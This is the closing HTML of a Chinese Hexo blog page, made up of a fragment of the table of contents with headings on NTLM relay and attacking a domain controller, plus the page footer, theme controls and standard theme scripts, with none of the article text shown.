Stealer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NTLM-Relay"><span class="toc-number">3.0.3.</span> <span class="toc-text">NTLM Relay</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%9F%9F%E6%8E%A7"><span class="toc-number">3.1.</span> <span class="toc-text">攻域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80"><span class="toc-number">3.1.1.</span> <span class="toc-text">方式一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C"><span class="toc-number">3.1.2.</span> <span class="toc-text">方式二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">5.</span> <span class="toc-text">工具</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 1ceC0la</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
